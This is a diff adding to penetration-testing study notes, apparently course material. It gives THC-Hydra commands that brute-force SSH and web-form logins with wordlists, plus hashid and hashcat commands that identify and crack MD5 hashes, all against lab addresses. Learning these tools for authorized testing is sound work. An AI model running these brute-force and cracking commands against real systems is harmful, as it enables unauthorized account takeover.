@@ -66,3 +66,31 @@ wordlist ( -C ), and the number of threads ( -n ) => *rdp just support one threa
 //using username “root” with a password list on ssh with 4 parallel tasks and verbose
 `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.13:22 -t 4 -V`
 or: `hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
+
+## HTTP POST Attack with THC-Hydra
+As an additional example, we will perform an HTTP POST attack against our Windows Apache
+server using Hydra. When a HTTP POST request is used for user login, it is most often through the
+use of a web form, which means we should use the “http-form-post” service module
+`hydra http-form-post -U`
+
+The complete command can now be executed. We will supply the admin user name ( `-l admin` )
+and wordlist ( `-P` ), request verbose output with `-vV` , and use `-f` to stop the attack when the first
+successful result is found. In addition, we will supply the service module name ( `http-form-post` )
+and its required arguments ( `“/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN”` )
+`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+
+# Hashes
+
+## Identifying hashes
+`hashid c43ee559d69bc7f691fe2fbfe8a5ef0a`
+Generates:
+Analyzing 'c43ee559d69bc7f691fe2fbfe8a5ef0a'
+[+] MD2
+
+## Decrypt hashes
+
+Example: cracking md5 (0 => md5) -a attackmode
+`hashcat -m 0 -a 0 "5f4dcc3b5aa765d61d8327deb882cf99"`
+
+OR add `--force` run with CPU instead of GPU; 0 => md5
+`hashcat -m 0 md5hash.txt /home/kali/Documents/rockyou.txt --force`
